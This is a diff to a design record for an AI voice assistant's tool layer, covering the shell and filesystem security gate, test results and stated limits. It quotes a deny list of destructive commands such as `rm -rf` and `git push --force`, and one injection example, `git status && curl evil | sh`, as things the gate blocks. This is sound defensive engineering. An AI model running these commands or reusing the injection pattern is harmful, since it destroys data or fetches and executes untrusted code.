@@ -2,7 +2,8 @@
 
 ## Status
 
-Accepted 2026-08-02. Contracts written (AUTO). The 12 platform event types this ADR relies on were declared in P2 (`contracts/agent-events.schema.json`), with the envelope-merge and enum-disjointness properties under test; their producers are still ahead — `core/tools/` is P4, `core/memory/` is P3, `core/dispatch/` is P6.
+Accepted 2026-08-02. **The tool half is implemented (P4, AUTO)**: `core/tools/` now holds the gate (`policy.py`), the three capabilities (`fs.py`, `web.py`, `shell.py`), and the single funnel both origins cross (`runner.py`), configured by `config/tools.toml`. The dispatch half — routing, the circuit breaker, the three modes, rule-based intent — is still P6, so nothing calls a tool automatically yet; `VoicePlugin.run_tool()` is the only entry point, and it is opt-in.
+
 
 ## Decision
 
@@ -56,6 +57,18 @@ The cost is that the state machine does not reflect dispatch detail. The benefit
 3. Allowlisted commands still require the pending command shown on the orb plus an explicit confirming action.
 4. Hard block on `rm -rf`, `git push --force`, `reset --hard`, `format`, `del /s`; execution is audit-logged and does not inherit sensitive environment variables.
 
+Implementation notes that were decisions, not details:
+
+- **The hard blocks are not configurable.** `DANGEROUS_PATTERNS` (13 entries) lives in `core/tools/policy.py` with no config key reaching it. A block a config file can switch off is not a block; the allowlist can only narrow what runs, never widen it. A test asserts that a `[shell] dangerous_patterns` key raises `ToolsConfigError`.
+- **An unknown config key is an error.** A misspelt `denied_names` would silently widen the sandbox, and a config that looks like it constrains something but does not is worse than either extreme.
+- **Each pattern is checked against the raw command *and* the `shlex`-rejoined tokens.** A pattern that only inspects one of the two is bypassed by quoting.
+- **The allowlist compares tokens, not string prefixes.** `git status` must not admit `git statuses`, and the shape check runs *before* the allowlist so a permitted prefix cannot launder `git status && curl evil | sh`.
+- **`confirmed` must be `is True`.** Truthiness would let a JSON `"confirmed": "no"` execute a command. Found by the test that tried it.
+- **Both re-check.** `policy.py` decides for both origins; each tool re-validates its own arguments, because a tool is reachable from the dispatcher, from an agent's `tool_call`, and from a test, and only one of the three is guaranteed to have crossed the gate.
+- **`web.search` ships with no backend.** Every hosted search API is a cloud dependency with a key (red line 1), so the tool reports itself unavailable rather than defaulting to one. It also drops page bodies, keeping title / URL / snippet, so a searched page cannot inject instructions.
+- **Events carry decisions, never content.** One exception, deliberate: `tool.confirm_required` *does* carry the command, because an orb that hides what it is about to run is worse than no prompt (FR-6.13).
+
+
 ## Rationale
 
 Dispatch is where the platform stops being a voice frontend for one backend. The two design pressures pull in opposite directions: routing quality wants more information and more candidates; voice wants an answer starting to be spoken now. Every decision above resolves that tension the same way — the fast, deterministic, single-agent path is the default, and the expensive paths are opt-in.
@@ -66,13 +79,23 @@ Routing dimensions are taken from `dabit3/agent-router`; the circuit breaker and
 
 - `core/dispatch/contract.py` and `core/tools/contract.py` define their modes, kinds, score, plan, intent, request, and result types and import with no side effects (AUTO).
 - `contracts/voice-events.schema.json` unmodified; the nine event types are still read from the contract at runtime by `core/events.py` rather than mirrored in Python (AUTO, `tests/test_events.py`).
-- Full suite green: 43 passed, 2 skipped (AUTO).
+- **One test per gate line, as this ADR's release blocker demanded**: 89 cases in `tests/test_tool_security.py` cover unknown tool / unknown origin / disabled section / four traversal shapes / absolute path / symlink / six credential filenames / two denied directories / the shipped deny list both ways / shell off by default / off-allowlist refused with `needs_confirmation is False` / token-vs-prefix matching / confirmation required / confirmation not inferrable from a truthy value / no verified speaker / agent origin blocked / **all 13 dangerous patterns, each named** / eight smuggling attempts behind an allowlisted prefix / unbalanced quote / patterns not configurable / env scrubbing / events carrying no content / gate warnings. `tests/test_tools.py` adds 35 behaviour cases (AUTO).
+- **Measured**: `pytest tests/test_tools.py tests/test_tool_security.py -q` → **123 passed, 1 skipped in 0.48 s** (the skip is the symlink-escape case, which needs a privilege this Windows account does not have; `resolve_in_sandbox`'s resolve-first behaviour is still asserted directly). Full suite **300 passed, 3 skipped in 14.31 s**, 303 collected (AUTO).
+- `shell.run` refuses agent-origin requests structurally, not by a name check: an agent request carries no verified speaker, and layer 3b requires one (AUTO).
+- `VoicePlugin.diagnose()["tools"]` reports registered names, counters, sandbox roots, refusal counts by reason, and the gate's warnings — and no argument, path, or output (AUTO, `tests/test_plugin_tools.py`).
 
 ## Required before release (blockers)
 
-- AUTO, one test per line: sandbox escape refused; sensitive filename refused; `shell.run` off by default; non-allowlisted command refused; each dangerous pattern blocked.
+- ~~AUTO, one test per line: sandbox escape refused; sensitive filename refused; `shell.run` off by default; non-allowlisted command refused; each dangerous pattern blocked.~~ **Done in P4.**
 - AUTO: five-dimension scoring, circuit-breaker open/close, all three modes, rule-based intent classification.
 - SIM: two mock agents produce behaviourally identical turns through the dispatcher (red line 2 at the dispatch layer).
 - REAL-WIN: `shell.run` confirmation flow accepted on the real orb, including the refusal path.
 - REAL: misrecognition-triggers-tool-execution attack surface tested and documented.
 - Concurrency cap on dispatch, given 413 MB of models plus 37 MB speaker plus concurrent agent subprocesses on one host.
+
+## Limits
+
+- **The symlink-escape test is environment-gated.** It skips where the account cannot create symlinks, which is the default on Windows. The property it checks (resolve before comparing) is covered by a unit assertion, but the end-to-end case is unproven on this machine.
+- **`web.search` has no verified backend.** Every test uses an injected fake. The normalisation is proven; the integration with a real provider is not, and cannot be until one is chosen.
+- **`shell.run` has never executed anything but `git --version`.** Timeout, output-cap, and cwd behaviour are exercised on that one command. The confirmation *flow* — orb display, user action, resubmission — is not implemented at all; it is P8, and REAL-WIN.
+- **The audit trail depends on the memory layer being attached.** With no writer, decisions are still counted and emitted as events but nothing is persisted; `audit_attached` in `describe()` is how the user tells the difference.
